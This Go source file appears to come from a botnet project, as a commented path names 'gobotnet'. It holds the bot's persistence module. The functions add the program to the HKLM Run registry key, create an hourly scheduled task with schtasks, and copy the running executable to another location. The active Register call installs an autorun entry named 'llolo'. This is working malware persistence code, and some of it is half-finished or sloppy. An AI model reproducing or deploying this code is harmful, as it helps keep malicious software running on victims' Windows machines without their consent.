package register

import (
	"fmt"
	"io"
	"os"
)

import cmd "../cmd"
import logging "../logging"

var (
	regSheduler bool = false
	regAutoRun  bool = false
)

func Register() error {
	_, err := registerAutoRun("llolo", getValueEnvVar("APPDATA"))
	//output, err := unRegisterSheduler("MyTaskOLol")
	//err := copyFileToDirectory(os.Args[0], "C:\\Users\\sashav2\\Desktop\\dsec\\gobotnet\\testcopy.exe")
	//fmt.Println(string(output))
	fmt.Println(err)
	return nil
}

func UnRegister() error {
	return nil
}

func CheckRegister() error {
	return nil
}

func registerAutoRun(nameProgram string, pathToFile string) ([]byte, error) {
	logging.DebugLogging("registerAutoRun")
	return cmd.CmdExec("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + nameProgram + " /d " + pathToFile)
}

func unRegisterAutoRun(nameProgram string, pathToFile string) ([]byte, error) {
	logging.DebugLogging("unRegisterAutoRun")
	return cmd.CmdExec("reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v " + nameProgram + " /d " + pathToFile)
}

func registerSheduler(nameTask string, pathToFile string) ([]byte, error) {
	logging.DebugLogging("registerSheduler")
	return cmd.CmdExec("schtasks /create /f /tn " + nameTask + " /sc hourly /mo 1 /tr " + pathToFile)
}

func unRegisterSheduler(nameTask string) ([]byte, error) {
	logging.DebugLogging("unRegisterSheduler")
	return cmd.CmdExec("schtasks /delete /f /tn " + nameTask)
}

func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	logging.DebugLogging("copyFileToDirectory from " + pathSourceFile + " to " + pathDestFile)
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
		logging.DebugLogging("copy success")
	} else {
		logging.DebugLogging("copy failed")
	}
	return nil
}

func getValueEnvVar(nameVarEnv string) string {
	return os.Getenv(nameVarEnv)
}
